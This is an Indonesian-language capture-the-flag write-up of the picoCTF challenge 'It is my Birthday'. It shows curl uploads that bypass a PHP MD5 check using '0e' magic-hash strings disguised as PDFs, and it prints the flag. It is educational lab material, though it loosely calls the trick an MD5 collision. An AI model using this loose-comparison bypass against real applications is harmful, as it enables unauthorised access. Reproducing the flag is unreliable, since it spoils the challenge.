# It is my Birthday
- Link: https://play.picoctf.org/practice/challenge/109?category=1&page=1

## Tantangan
I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:50970/

## Penyelesaian
- Buka URL http://mercury.picoctf.net:50970/ di browser, di halaman web ini kita bisa mengupload 2 buah file 


- Jika kita tekan `Ctrl+U` akan terlihat source code sebagai berikut



- Sekarang kita coba buat sebuah file berformat `txt` setelah itu kita upload file tersebut ke website dengan tool `curl`. Disini muncul pesan bahwa file tersebut harus PDF
```sh
echo 'testing' > testing.txt
curl -F 'file1=@testing.txt'  -F 'file2=@testing.txt' -F 'submit=Upload' http://mercury.picoctf.net:50970/
```


- Sekarang kita coba ubah file tersebut menjadi `pdf` kemudian kita upload lagi menggunakan tool `curl`. Disini muncul pesan bahwa file tersebut tidak sama
```sh
mv testing.txt testing.pdf
curl -F 'file1=@testing.pdf'  -F 'file2=@testing.pdf' -F 'submit=Upload' http://mercury.picoctf.net:50970/
```

- Dari uraian soal dan petunjuk, kita tahu bahwa md5 di PHP memiliki kelemahan yang disebut dengan [MD5 Collision](https://www.mscs.dal.ca/~selinger/md5collision/) Dimana jika kedua string berbentuk `0e[\d]+` dibandingkan dengan tanda `==` maka dianggap sama sehingga `'0e1' == '00e2' == '0'` seperti contoh berikut ini:
```sh
php -r "echo md5('240610708');"
php -r "echo md5('QNKCDZO');"
php -r "var_dump(md5('240610708') == md5('QNKCDZO'));"
```

- Sekarang kita buat file PDF dengan acuan hash diatas
```sh
echo -n "240610708" > file1.pdf
echo -n "QNKCDZO" > file2.pdf
md5sum file1.pdf file2.pdf
```

- Setelah itu kita upload kedua file tersebut ke web dan disini kita berhasil mendapatkan flag
```sh
curl -F 'file1=@file1.pdf'  -F 'file2=@file2.pdf' -F 'submit=Upload' http://mercury.picoctf.net:50970/
```

- Untuk mempermudah mendapatkan flag kita bisa pakai perintah berikut
```sh
curl -F 'file1=@file1.pdf'  -F 'file2=@file2.pdf' -F 'submit=Upload' http://mercury.picoctf.net:50970/ | egrep -o "picoCTF{[^}]+}"
```


- Flag
```sh
picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}
```